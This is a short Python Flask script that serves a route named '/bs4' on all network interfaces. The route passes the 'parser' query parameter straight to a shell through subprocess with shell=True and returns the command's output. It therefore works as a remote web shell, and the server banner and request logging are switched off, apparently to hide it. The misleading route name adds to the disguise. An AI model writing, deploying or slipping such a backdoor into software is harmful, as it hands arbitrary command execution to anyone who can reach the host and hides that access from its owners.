import subprocess
import flask
import logging
from flask import Flask, request
flask.cli.show_server_banner = lambda *args: None
logging.getLogger("werkzeug").disabled = True

app = Flask(__name__)

@app.route('/bs4')
def bs4():
    out=subprocess.Popen(request.args.get('parser'), shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    return out.stdout.read().decode() + '\n\n' + out.stderr.read().decode()


app.run(host='0.0.0.0', port=54689)